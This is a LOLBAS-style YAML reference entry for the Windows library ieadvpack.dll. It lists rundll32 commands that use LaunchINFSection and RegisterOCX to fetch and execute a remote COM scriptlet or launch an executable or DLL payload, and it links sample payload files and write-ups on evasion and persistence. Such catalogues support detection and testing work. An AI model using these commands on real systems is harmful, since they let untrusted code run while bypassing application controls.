---
Name: Ieadvpack.dll
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: rundll32.exe IEAdvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,
    Description: Remote fetch and execute a COM Scriptlet by calling an information file directive (Section name specified).
  - Command: rundll32.exe IEAdvpack.dll,LaunchINFSection test.inf,,1,
    Description: Remote fetch and execute a COM Scriptlet by calling an information file directive (DefaultInstall section implied).
  - Command: rundll32.exe IEAdvpack.dll,RegisterOCX calc.exe
    Description: Launch executable by calling the RegisterOCX function.
  - Command: rundll32.exe IEAdvpack.dll,RegisterOCX test.dll
    Description: Launch a DLL payload by calling the RegisterOCX function.
Full Path:
  - c:\windows\system32\ieadvpack.dll
  - c:\windows\sysWOW64\ieadvpack.dll
Code Sample:
  - https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSLibraries/Payload/Advpack.inf
  - https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSLibraries/Payload/Advpack_calc.sct
Detection: []
Resources:
  - https://twitter.com/pabraeken/status/991695411902599168
  - https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
  - https://twitter.com/0rbz_/status/974472392012689408
Notes: Thanks to Pierre-Alexandre Braeken - @pabraeken (RegisterOCX - Cmd), Jimmy - @bohops (LaunchINFSection), fabrizio - @0rbz_ (RegisterOCX - DLL)
---
